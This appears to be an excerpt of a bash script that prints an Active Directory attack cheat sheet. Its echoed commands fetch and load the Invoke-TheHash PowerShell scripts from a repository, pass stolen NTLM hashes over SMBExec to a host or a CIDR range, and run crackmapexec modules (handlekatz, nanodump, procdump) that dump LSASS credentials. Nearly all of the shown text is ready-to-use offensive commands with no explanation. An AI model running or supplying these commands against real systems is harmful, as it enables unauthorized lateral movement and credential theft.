...
echo -e "$DownloadMethod "$InvokeTheHashRepo"Invoke-WMIExec.ps1);"
echo -e "$DownloadMethod "$InvokeTheHashRepo"Invoke-TheHash.ps1);"
...
echo -e "Invoke-TheHash -Type SMBExec -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target $IP"
echo -e "Invoke-TheHash -Type SMBExec -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target [CIDR]"
echo -e ""
echo -e "${YELLOW}Pass hash to target and execute specified command ${RESTORE}"
...
echo -e ""
echo -e "${YELLOW}Enumerate SMB Shares / Users / Net Sessions ${RESTORE}"
...
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M handlekatz"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M nanodump"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M procdump"
echo -e ""
